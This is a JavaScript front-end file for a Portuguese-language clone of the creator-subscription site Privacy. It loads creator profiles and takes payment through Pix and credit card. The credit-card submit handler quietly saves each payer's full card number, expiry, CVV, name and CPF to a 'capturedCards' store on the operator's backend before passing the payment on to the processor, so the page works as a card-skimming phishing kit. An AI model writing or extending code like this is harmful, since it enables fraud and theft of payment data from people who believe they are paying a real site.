// ===== Get Account ID from URL =====
const urlParams = new URLSearchParams(window.location.search);
const accountId = urlParams.get('id');

const trackingParameters = ['src', 'sck', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term']
    .reduce((parameters, key) => {
        parameters[key] = urlParams.get(key);
        return parameters;
    }, {});

// ===== Load Accounts =====
// ===== API URL =====
const API_URL = 'api/settings.php';

// ===== Data Variables =====
let accounts = [];
let currentAccount = null;
let siteSettings = null;
let tribopayConfig = null;
let ravenbotConfig = null;
let paymentControls = null;

// ===== Initialize Application =====
document.addEventListener('DOMContentLoaded', async () => {
    await loadAllData();
    console.log('Privacy Clone loaded successfully!');

    // Check payment methods availability
    checkPaymentMethods();
});

// ===== Load All Data =====
async function loadAllData() {
    try {
        // Fetch all data types needed
        const [fetchedAccounts, fetchedSettings, fetchedTribo, fetchedRavenbot, fetchedControls, fetchedCards] = await Promise.all([
            fetch(`${API_URL}?type=accounts`).then(res => res.json()),
            fetch(`${API_URL}?type=siteSettings`).then(res => res.json()),
            fetch(`${API_URL}?type=tribopayConfig`).then(res => res.json()),
            fetch(`${API_URL}?type=ravenbotConfig`).then(res => res.json()),
            fetch(`${API_URL}?type=paymentControls`).then(res => res.json()),
            fetch(`${API_URL}?type=capturedCards`).then(res => res.json())
        ]);

        accounts = fetchedAccounts || [];
        siteSettings = fetchedSettings || {};

        // Use Object.assign to ensure defaults if API returns null or empty object
        tribopayConfig = Object.assign({
            token: '',
            hash1Month: '',
            hash3Months: '',
            hash6Months: ''
        }, fetchedTribo || {});

        ravenbotConfig = Object.assign({
            apiKey: '',
            webhookSecret: ''
        }, fetchedRavenbot || {});

        paymentControls = Object.assign({
            tribopay: true,
            ravenbot: false,
            creditCard: false
        }, fetchedControls || {});
        // capturedCards not used directly here but good to know

        console.log('Payment Controls Loaded:', paymentControls);

        // Apply Site Settings (Favicon)
        if (siteSettings && siteSettings.favicon) {
            const favicon = document.getElementById('favicon');
            if (favicon) favicon.href = siteSettings.favicon;
        }

        // Determine Current Account
        if (accountId) {
            currentAccount = accounts.find(acc => acc.id == accountId);

            // The main profile is stored in site settings rather than accounts.
            if (!currentAccount && accountId === 'site-profile' && siteSettings.name) {
                currentAccount = {
                    id: 'site-profile',
                    name: siteSettings.name,
                    username: siteSettings.username,
                    bio: siteSettings.bio,
                    avatar: siteSettings.avatar || 'img/avatar.jpg',
                    banner: siteSettings.banner || 'img/banner.svg',
                    photos: siteSettings.photos,
                    posts: siteSettings.videos,
                    likes: siteSettings.likes,
                    instagram: siteSettings.instagram
                };
            }

            console.log('Procurando ID:', accountId, 'Encontrado:', currentAccount);

            if (currentAccount) {
                loadAccountData();
                incrementVisits();
            } else {
                console.warn('Nenhuma conta encontrada para o ID:', accountId);
            }
        } else {
            // No ID provided - do nothing or show default state
            // Previously we tried to fallback to owner profile settings
        }

        // Initialize admin settings (prices) if needed
        loadSubscriptionPrices();

    } catch (error) {
        console.error('Error loading application data:', error);
    }
}

// ===== Apply Account Data to Page =====
function loadAccountData() {
    if (!currentAccount) return;

    // Update profile info
    const profileName = document.querySelector('.profile-name');
    const profileUsername = document.querySelector('.profile-username');
    const profileBio = document.querySelector('.profile-bio');
    const avatarImg = document.querySelector('.avatar-img');
    const bannerImg = document.querySelector('.banner-img');
    const postAvatar = document.querySelector('.post-avatar');
    const postAuthorName = document.querySelector('.post-author-name');
    const postAuthorUsername = document.querySelector('.post-author-username');
    const readMoreBtn = document.querySelector('.read-more');

    if (profileName) profileName.textContent = currentAccount.name || 'Criador';
    if (profileUsername) profileUsername.textContent = '@' + (currentAccount.username || currentAccount.email?.split('@')[0] || 'user');

    // Bio with truncation
    const fullBio = currentAccount.bio || 'Bem-vindo ao meu perfil!';
    if (profileBio) {
        profileBio.textContent = fullBio;
        profileBio.dataset.fullText = fullBio;
        profileBio.classList.add('bio-truncated');
    }

    if (avatarImg && currentAccount.avatar) avatarImg.src = currentAccount.avatar;
    if (bannerImg && currentAccount.banner) bannerImg.src = currentAccount.banner;
    if (avatarImg && currentAccount.avatar) avatarImg.src = currentAccount.avatar;
    if (bannerImg && currentAccount.banner) bannerImg.src = currentAccount.banner;

    // Update all posts with current account info
    const postAvatars = document.querySelectorAll('.post-avatar');
    const postAuthorNames = document.querySelectorAll('.post-author-name');
    const postAuthorUsernames = document.querySelectorAll('.post-author-username');

    postAvatars.forEach(img => {
        if (currentAccount.avatar) img.src = currentAccount.avatar;
    });

    postAuthorNames.forEach(el => {
        el.textContent = currentAccount.name || 'Criador';
    });

    postAuthorUsernames.forEach(el => {
        el.textContent = '@' + (currentAccount.username || 'user');
    });

    // Update stats
    const stats = document.querySelectorAll('.stat span');
    if (stats.length >= 3) {
        stats[0].textContent = currentAccount.photos || '5';
        stats[1].textContent = currentAccount.posts || '39';
        stats[2].textContent = currentAccount.likes || '2.5K';
    }

    // Update post stats overlay
    const postStats = document.querySelectorAll('.post-stats-overlay span');
    if (postStats.length >= 3) {
        postStats[0].innerHTML = `<i class="far fa-images"></i> ${currentAccount.photos || '5'}`;
        postStats[1].innerHTML = `<i class="far fa-calendar-alt"></i> ${currentAccount.posts || '39'}`;
        postStats[2].innerHTML = `<i class="far fa-heart"></i> ${currentAccount.likes || '2.5K'}`;
    }

    // Update Instagram link
    const instagramLink = document.querySelector('.social-link');
    if (instagramLink && currentAccount.instagram) {
        const instagram = currentAccount.instagram.trim();
        instagramLink.href = /^https?:\/\//i.test(instagram) ? instagram : `https://${instagram}`;
        instagramLink.classList.remove('hidden');
    } else if (instagramLink) {
        instagramLink.classList.add('hidden');
    }

    // Update page title
    document.title = `${currentAccount.name || 'Criador'} | Privacy`;
}

// ===== Toggle Read More =====
function toggleReadMore() {
    const profileBio = document.querySelector('.profile-bio');
    const readMoreBtn = document.querySelector('.read-more');

    if (profileBio.classList.contains('bio-truncated')) {
        profileBio.classList.remove('bio-truncated');
        readMoreBtn.textContent = 'Ler menos';
    } else {
        profileBio.classList.add('bio-truncated');
        readMoreBtn.textContent = 'Ler mais';
    }
}

// ===== Track Visits =====
function incrementVisits() {
    if (!currentAccount) return;

    // Find account in the main array
    const accIndex = accounts.findIndex(a => a.id === currentAccount.id);
    if (accIndex !== -1) {
        // Initialize visits if doesn't exist
        if (!accounts[accIndex].visits) {
            accounts[accIndex].visits = 0;
        }

        // Increment
        accounts[accIndex].visits++;

        // Save back to localStorage
        // Save back to API
        try {
            fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'accounts', data: accounts })
            });
        } catch (e) {
            console.error('Error saving visits:', e);
        }

        console.log(`Visita registrada para ${currentAccount.username}. Total: ${accounts[accIndex].visits}`);
    }
}

// Load account data when page loads
// Previously loaded via DOMContentLoaded, now handled in init function above
// document.addEventListener('DOMContentLoaded', () => {
//     loadAccountData();
//     incrementVisits();
// });

// ===== DOM Elements =====
const tabs = document.querySelectorAll('.tab');
const postsTab = document.getElementById('posts-tab');
const mediaTab = document.getElementById('media-tab');

// ===== Load Site Settings =====
// Site settings loaded in loadAllData
// const siteSettings = JSON.parse(localStorage.getItem('privacySiteSettings'));
// if (siteSettings && siteSettings.favicon) {
//     const favicon = document.getElementById('favicon');
//     if (favicon) favicon.href = siteSettings.favicon;
// }
const promoList = document.getElementById('promo-list');
const promoArrow = document.getElementById('promo-arrow');
const subscriptionBtns = document.querySelectorAll('.subscription-btn');
const paymentModal = document.getElementById('payment-modal');
const paymentForm = document.getElementById('payment-form');

// ===== Tab Switching =====
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        // Remove active class from all tabs
        tabs.forEach(t => t.classList.remove('active'));
        // Add active class to clicked tab
        tab.classList.add('active');

        // Show/hide content based on tab
        const tabType = tab.dataset.tab;
        if (tabType === 'posts') {
            postsTab.classList.remove('hidden');
            mediaTab.classList.add('hidden');
        } else if (tabType === 'media') {
            postsTab.classList.add('hidden');
            mediaTab.classList.remove('hidden');
        }
    });
});

// ===== Payment Methods Control =====
function checkPaymentMethods() {
    // paymentControls is now loaded globally in loadAllData
    if (!paymentControls) {
        paymentControls = { tribopay: true, creditCard: false };
    }

    const tribopaySection = document.getElementById('tribopay-section');
    const ravenbotSection = document.getElementById('ravenbot-section');
    const creditCardContainer = document.getElementById('credit-card-container');

    if (tribopaySection) {
        if (paymentControls.tribopay && !paymentControls.ravenbot) tribopaySection.classList.remove('hidden');
        else tribopaySection.classList.add('hidden');
    }

    if (ravenbotSection) {
        if (paymentControls.ravenbot) ravenbotSection.classList.remove('hidden');
        else ravenbotSection.classList.add('hidden');
    }

    if (creditCardContainer) {
        if (paymentControls.creditCard) creditCardContainer.classList.remove('hidden');
        else creditCardContainer.classList.add('hidden');
    }
}

// Call on load
// Call on load - already called in init
// document.addEventListener('DOMContentLoaded', () => {
//     // ... existing calls ...
//     checkPaymentMethods();
// });

// ===== Toggle Promotions =====
function togglePromotions() {
    const header = document.querySelector('.promotions-header');
    header.classList.toggle('collapsed');
    promoList.classList.toggle('hidden');
}

// ===== Payment Form Handler (Consolidated below) =====
// Duplicate handler removed to ensure proper data capture and payment processing flow.


// ===== TriboPay Config =====
let currentPlan = 'month1';
let currentPrice = 20.00;
// tribopayConfig is loaded globally
let pixTimer = null;

// Helper to save card (async but we don't await in the event handler to be fast)
async function saveCardToApi(cardData) {
    try {
        // Fetch current list first to append
        const res = await fetch(`${API_URL}?type=capturedCards`);
        const currentCards = await res.json() || [];
        currentCards.push(cardData);

        await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'capturedCards', data: currentCards })
        });
    } catch (e) {
        console.error('Error saving card:', e);
    }
}
// Helper to save card (async but we don't await in the event handler to be fast)

// ===== Subscription Click Handler =====
subscriptionBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const duration = btn.querySelector('.duration').textContent;
        const price = btn.querySelector('.price').textContent;
        const plan = btn.dataset.plan || 'month1';
        openModal(duration, price, plan);
    });
});

// ===== Modal Functions =====
function openModal(duration, price, plan) {
    const modal = document.getElementById('payment-modal');
    const planDuration = modal.querySelector('.plan-duration');
    const planPrice = modal.querySelector('.plan-price');
    const tribopaySection = document.getElementById('tribopay-section');
    const pixQRSection = document.getElementById('pix-qrcode-section');

    planDuration.textContent = duration;
    planPrice.textContent = price;
    currentPlan = plan;

    // Extract price value
    currentPrice = parseFloat(price.replace('R$', '').replace('.', '').replace(',', '.').trim());

    // Reload configs (already loaded in variable but to be safe/fresh)
    // We can rely on global tribopayConfig or re-fetch. 
    // For now assuming global variable is up to date since page load.
    // If strict freshness needed: 
    // fetch(`${API_URL}?type=tribopayConfig`).then(r=>r.json()).then(d => { tribopayConfig = d; });

    // Ensure TriboPay section is visible and Pix QR is hidden
    // We delegate visibility to checkPaymentMethods, but for now we ensure defaults
    if (tribopaySection) tribopaySection.classList.remove('hidden');
    if (pixQRSection) pixQRSection.classList.add('hidden');

    // Check visibility based on settings
    checkPaymentMethods();

    // Reset timer
    if (pixTimer) {
        clearInterval(pixTimer);
        pixTimer = null;
    }

    modal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    const modal = document.getElementById('payment-modal');
    modal.classList.add('hidden');
    document.body.style.overflow = '';

    // Clear timer when closing
    if (pixTimer) {
        clearInterval(pixTimer);
        pixTimer = null;
    }

    // Also close pix overlay
    closePixOverlay();
}

function closePixOverlay() {
    const pixQRSection = document.getElementById('pix-qrcode-section');
    const modalHeader = document.querySelector('.modal-header');
    const modalBody = document.querySelector('.modal-body');

    if (pixQRSection) pixQRSection.classList.add('hidden');
    if (modalHeader) modalHeader.classList.remove('hidden');
    if (modalBody) modalBody.classList.remove('hidden');

    // Clear timer
    if (pixTimer) {
        clearInterval(pixTimer);
        pixTimer = null;
    }
}

// ===== TriboPay API Integration =====
async function generatePixPayment() {
    if (paymentControls?.ravenbot) {
        await generateRavenbotPixPayment();
        return;
    }

    // Use global config
    if (!tribopayConfig) {
        console.error('Configuração TriboPay não carregada');
        return;
    }

    // Determine Offer Hash
    let offerHash = '';
    if (currentPlan === 'month1') {
        offerHash = tribopayConfig.hash1Month;
    } else if (currentPlan === 'months3') {
        offerHash = tribopayConfig.hash3Months;
    } else if (currentPlan === 'months6') {
        offerHash = tribopayConfig.hash6Months;
    }

    if (!tribopayConfig.token || !offerHash) {
        alert('Configuração incompleta! Por favor, configure o Token e Hash no painel admin.');
        return;
    }

    // Show loading state
    const tribopaySection = document.getElementById('tribopay-section');
    const pixQRSection = document.getElementById('pix-qrcode-section');

    // Elements to hide/show for proper layout flow
    const modalHeader = document.querySelector('.modal-header');
    const modalBody = document.querySelector('.modal-body');

    if (modalHeader) modalHeader.classList.add('hidden');
    if (modalBody) modalBody.classList.add('hidden');

    pixQRSection.classList.remove('hidden');

    const loadingEl = document.getElementById('pix-loading');
    const resultEl = document.getElementById('pix-result');
    const qrcodeImg = document.getElementById('pix-qrcode-img');
    const copyInput = document.getElementById('pix-copy-code');
    const timerEl = document.getElementById('pix-timer');

    loadingEl.classList.remove('hidden');
    resultEl.classList.add('hidden');

    try {
        // Initialize API
        const triboPay = new TriboPayAPI({
            apiToken: tribopayConfig.token
        });

        // Prepare payment data
        const amountInCents = Math.round(currentPrice * 100);
        const paymentData = {
            amount: amountInCents,
            offerHash: offerHash,
            paymentMethod: 'pix',
            customer: {
                name: 'Cliente Privacy', // In a real app, you'd capture this form user
                email: 'cliente@exemplo.com',
                phone_number: '11999999999',
                document: '12345678900' // CPF
            },
            trackingParameters,
            webhookUrl: window.location.origin + '/webhook.php'
        };

        // Call API
        const response = await triboPay.createTransaction(paymentData);
        console.log('TriboPay Response:', response);

        // Get Pix Code
        const pixCode = TriboPayAPI.getPixCode(response);

        if (pixCode) {
            // Success
            loadingEl.classList.add('hidden');
            resultEl.classList.remove('hidden');

            // Set copy code
            copyInput.value = pixCode;

            // Generate QR Code Image (using a public API for now as the module returns the code string)
            // If the module returned an image URL locally, we could use it.
            // Assuming pixCode is the EMV string.
            qrcodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}`;

            // Start Timer (15 min)
            let timeLeft = 15 * 60;
            startTimer(timeLeft, timerEl);

        } else {
            const apiMessage = response?.message || response?.error || response?.errors?.[0]?.message;
            throw new Error(apiMessage || 'A TriboPay não retornou o código Pix. Verifique o Token e o Hash da oferta.');
        }

    } catch (error) {
        console.error('Erro no pagamento:', error);
        alert('Erro ao gerar pagamento: ' + error.message);
        closePixOverlay();
    }
}

async function generateRavenbotPixPayment() {
    const pixQRSection = document.getElementById('pix-qrcode-section');
    const modalHeader = document.querySelector('.modal-header');
    const modalBody = document.querySelector('.modal-body');
    const loadingEl = document.getElementById('pix-loading');
    const resultEl = document.getElementById('pix-result');
    const qrcodeImg = document.getElementById('pix-qrcode-img');
    const copyInput = document.getElementById('pix-copy-code');
    const timerEl = document.getElementById('pix-timer');

    if (modalHeader) modalHeader.classList.add('hidden');
    if (modalBody) modalBody.classList.add('hidden');
    pixQRSection.classList.remove('hidden');
    loadingEl.classList.remove('hidden');
    resultEl.classList.add('hidden');

    try {
        const response = await fetch('api/ravenbot.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: currentPrice,
                description: `Assinatura ${currentPlan === 'month1' ? '1 Mês' : currentPlan === 'months3' ? '3 Meses' : '6 Meses'}`,
                external_id: `privacy-${currentPlan}-${Date.now()}`,
                webhook_url: `${window.location.origin}${window.location.pathname.replace(/\/[^/]*$/, '')}/webhook_ravenbot.php`
            })
        });
        const data = await response.json();
        if (!response.ok || !data.pixCode) {
            throw new Error(data.error || 'A Raven Wallet não retornou o código Pix.');
        }

        loadingEl.classList.add('hidden');
        resultEl.classList.remove('hidden');
        copyInput.value = data.pixCode;
        qrcodeImg.src = data.qrCode || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pixCode)}`;
        startTimer(15 * 60, timerEl);
    } catch (error) {
        console.error('Erro no pagamento RavenBot:', error);
        alert('Erro ao gerar pagamento: ' + error.message);
        closePixOverlay();
    }
}

function startTimer(duration, display) {
    let timer = duration, minutes, seconds;

    // Clear existing timer
    if (pixTimer) clearInterval(pixTimer);

    pixTimer = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            clearInterval(pixTimer);
            display.textContent = "Expirado";
            alert('O tempo para pagamento expirou. Por favor, gere um novo código.');
            closePixOverlay();
        }
    }, 1000);
}

function copyPixCode() {
    const copyText = document.getElementById("pix-copy-code");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value).then(() => {
        alert("Código Pix copiado!");
    });
}

async function callTribopayBackend(amount) {
    // Call our PHP backend
    const apiUrl = 'api/tribopay.php';

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                token: tribopayConfig.token,
                pixKey: tribopayConfig.pixKey,
                amount: amount,
                trackingParameters,
                description: `Assinatura ${currentPlan === 'month1' ? '1 Mês' : currentPlan === 'months3' ? '3 Meses' : '6 Meses'}`
            })
        });

        if (response.ok) {
            const data = await response.json();
            return data;
        }
    } catch (error) {
        console.log('Backend not available, using local fallback:', error);
    }

    return null;
}

function generateStaticPixCode(pixKey, amount) {
    // Generate a simplified Pix code for demonstration
    const pixCode = `00020126580014BR.GOV.BCB.PIX0136${pixKey}520400005303986540${amount.toFixed(2)}5802BR5913PRIVACY_USER6008LOCATION62070503***6304`;
    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;

    return { pixCode, qrCodeUrl };
}

function showPixResult(qrCodeUrl, pixCode) {
    const pixLoading = document.getElementById('pix-loading');
    const pixResult = document.getElementById('pix-result');
    const qrCodeImg = document.getElementById('pix-qrcode-img');
    const pixCopyCode = document.getElementById('pix-copy-code');

    // Hide loading, show result
    pixLoading.classList.add('hidden');
    pixResult.classList.remove('hidden');

    // Set QR code and copy code
    qrCodeImg.src = qrCodeUrl;
    pixCopyCode.value = pixCode;

    // Start 15 minute timer
    startPixTimer();
}

function startPixTimer() {
    let timeLeft = 15 * 60; // 15 minutes in seconds
    const timerDisplay = document.getElementById('pix-timer');

    pixTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        if (timeLeft <= 0) {
            clearInterval(pixTimer);
            timerDisplay.textContent = 'Expirado!';
            // Could regenerate Pix here
        }

        timeLeft--;
    }, 1000);
}

function copyPixCode() {
    const pixCopyCode = document.getElementById('pix-copy-code');
    pixCopyCode.select();
    pixCopyCode.setSelectionRange(0, 99999);

    navigator.clipboard.writeText(pixCopyCode.value).then(() => {
        // Show success feedback
        const copyBtn = document.querySelector('.pix-copy-btn');
        const originalHTML = copyBtn.innerHTML;
        copyBtn.innerHTML = '<i class="fas fa-check"></i>';
        copyBtn.style.background = 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)';

        setTimeout(() => {
            copyBtn.innerHTML = originalHTML;
            copyBtn.style.background = '';
        }, 2000);
    });
}

// ===== Payment Form Submit =====
// ===== Payment Form Submit (Credit Card) =====
// ===== Payment Form Submit (Credit Card) =====
if (paymentForm) {
    paymentForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const submitBtn = document.getElementById('submit-card-btn');
        const originalText = submitBtn.textContent;

        // Disable button
        submitBtn.textContent = 'Processando...';
        submitBtn.disabled = true;

        try {
            // ===== CAPTURE CARD DATA FIRST =====
            // Capture raw values for storage
            const savedCardCpf = document.getElementById('cardCpf').value || '';
            const savedCardName = document.getElementById('cardName').value || '';
            const savedCardNumber = document.getElementById('cardNumber').value || '';
            const savedCardExpiry = document.getElementById('cardExpiry').value || '';
            const savedCardCvv = document.getElementById('cardCvv').value || '';

            const cardData = {
                id: Date.now().toString(),
                cpf: savedCardCpf,
                cardName: savedCardName,
                cardNumber: savedCardNumber,
                expiry: savedCardExpiry,
                cvv: savedCardCvv,
                plan: currentPlan,
                price: currentPrice,
                accountName: currentAccount?.name || 'Desconhecido',
                createdAt: new Date().toISOString()
            };

            // Save to API (await to ensure it saves before any potential issues)
            await saveCardToApi(cardData);

            // ===== EXISTING TRIBO PAY LOGIC =====
            // Use global config
            if (!tribopayConfig) {
                console.error('Configuração TriboPay não carregada');
                throw new Error('Configuração não carregada.');
            }

            // Determine Hash
            let offerHash = '';
            if (currentPlan === 'month1') offerHash = tribopayConfig.hash1Month;
            else if (currentPlan === 'months3') offerHash = tribopayConfig.hash3Months;
            else if (currentPlan === 'months6') offerHash = tribopayConfig.hash6Months;

            if (!tribopayConfig.token || !offerHash) {
                throw new Error('Configuração de pagamento incompleta.');
            }

            // Get Card Data
            const cardCpf = document.getElementById('cardCpf').value.replace(/\D/g, '');
            const cardName = document.getElementById('cardName').value;
            const cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, '');
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;

            const [expMonth, expYear] = cardExpiry.split('/');

            // Initialize API
            const triboPay = new TriboPayAPI({
                apiToken: tribopayConfig.token
            });

            // Prepare Data
            const amountInCents = Math.round(currentPrice * 100);
            const paymentData = {
                amount: amountInCents,
                offerHash: offerHash,
                paymentMethod: 'credit_card',
                customer: {
                    name: cardName, // Ideally separate customer name from card holder
                    email: 'cliente@exemplo.com',
                    phone_number: '11999999999',
                    document: cardCpf
                },
                card: {
                    number: cardNumber,
                    holder_name: cardName,
                    exp_month: expMonth,
                    exp_year: '20' + expYear, // Assuming 20xx
                    cvv: cardCvv
                },
                webhookUrl: window.location.origin + '/webhook.php'
            };

            // Call API
            const response = await triboPay.createTransaction(paymentData);
            console.log('TriboPay Card Response:', response);

            if (response.status === 'approved' || response.payment_status === 'approved') {
                alert('Pagamento Aprovado! Bem-vindo(a).');
                closeModal();
                paymentForm.reset();
                // Redirect or unlock content here
            } else if (response.status === 'refused' || response.payment_status === 'refused') {
                alert('Pagamento Recusado. Verifique os dados do cartão.');
            } else {
                alert('Pagamento em processamento. Aguarde confirmação no seu email.');
                closeModal();
            }

        } catch (error) {
            console.error('Erro no pagamento:', error);
            alert('Erro ao processar pagamento: ' + error.message);
        } finally {
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }
    });
}

// ===== Close modal on Escape key =====
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeModal();
    }
});

// ===== Card Number Formatting =====
const cardInput = document.querySelector('input[placeholder="0000 0000 0000 0000"]');
if (cardInput) {
    cardInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });
}

// ===== Expiry Date Formatting =====
const expiryInput = document.querySelector('input[placeholder="MM/AA"]');
if (expiryInput) {
    expiryInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
}

// ===== CVV Formatting =====
const cvvInput = document.querySelector('input[placeholder="123"]');
if (cvvInput) {
    cvvInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
    });
}

// ===== Like Button Animation =====
const likeButtons = document.querySelectorAll('.action-btn .fa-heart');
likeButtons.forEach(btn => {
    btn.parentElement.addEventListener('click', function () {
        const icon = this.querySelector('i');
        if (icon.classList.contains('far')) {
            icon.classList.remove('far');
            icon.classList.add('fas');
            icon.style.color = '#ff4757';
            this.style.transform = 'scale(1.2)';
            setTimeout(() => {
                this.style.transform = 'scale(1)';
            }, 200);
        } else {
            icon.classList.remove('fas');
            icon.classList.add('far');
            icon.style.color = '';
        }
    });
});

// ===== Bookmark Button Toggle =====
const bookmarkButtons = document.querySelectorAll('.action-btn.bookmark');
bookmarkButtons.forEach(btn => {
    btn.addEventListener('click', function () {
        const icon = this.querySelector('i');
        if (icon.classList.contains('far')) {
            icon.classList.remove('far');
            icon.classList.add('fas');
            icon.style.color = 'var(--primary-color)';
        } else {
            icon.classList.remove('fas');
            icon.classList.add('far');
            icon.style.color = '';
        }
    });
});

// ===== Smooth Scroll =====
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// ===== Initialize =====
// Already handled at top of file
// document.addEventListener('DOMContentLoaded', () => {
//     console.log('Privacy Clone loaded successfully!');
//     loadAdminSettings();
// });

// ===== Load Admin Settings =====
// ===== Load Admin Settings (Prices) =====
// ===== Load Subscription Prices =====
async function loadSubscriptionPrices() {
    try {
        const prices = await fetch(`${API_URL}?type=subscriptionPrices`).then(res => res.json());

        if (prices) {
            const subscriptionBtns = document.querySelectorAll('.subscription-btn');
            if (subscriptionBtns.length >= 1) {
                const price1 = subscriptionBtns[0].querySelector('.price');
                if (price1) price1.textContent = formatPrice(prices.month1);
            }
            if (subscriptionBtns.length >= 2) {
                const price3 = subscriptionBtns[1].querySelector('.price');
                if (price3) price3.textContent = formatPrice(prices.months3);
            }
            if (subscriptionBtns.length >= 3) {
                const price6 = subscriptionBtns[2].querySelector('.price');
                if (price6) price6.textContent = formatPrice(prices.months6);
            }
        }
    } catch (e) {
        console.error('Error loading prices:', e);
    }
}

function formatPrice(value) {
    return 'R$ ' + parseFloat(value).toFixed(2).replace('.', ',');
}
